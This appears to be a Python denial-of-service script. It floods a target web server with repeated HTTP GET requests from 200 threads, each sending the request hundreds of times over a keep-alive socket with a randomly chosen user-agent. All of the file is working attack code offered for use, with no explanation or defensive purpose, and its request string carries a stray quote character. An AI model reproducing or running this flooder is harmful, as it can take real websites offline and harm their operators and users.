import threading, socket, sys, random
from urllib.parse import *

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def http_sock(url,timing,req):
    sock = socket.socket()
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
    sock.connect((str(url['host']), int(url['port'])))
    for _ in range(int(timing)):
        try:
            try:
                for i in range(100):
                    sock.send(str.encode(req))
            except:
                sock.close()
        except:
            pass

url = sys.argv[1]
timing = sys.argv[2]
with open('Config/UA.txt', 'r') as f:
    ua = f.readlines()
    f.close()
target = get_target(url)
req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
req += "User-Agent: " + random.choice(ua) + "\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
req += "Connection: Keep-Alive\r\n\r\n"
for _ in range(int(200)):
    try:
        thd = threading.Thread(target=http_sock, args=(target,timing,req))
        thd.start()
    except Exception:
        pass


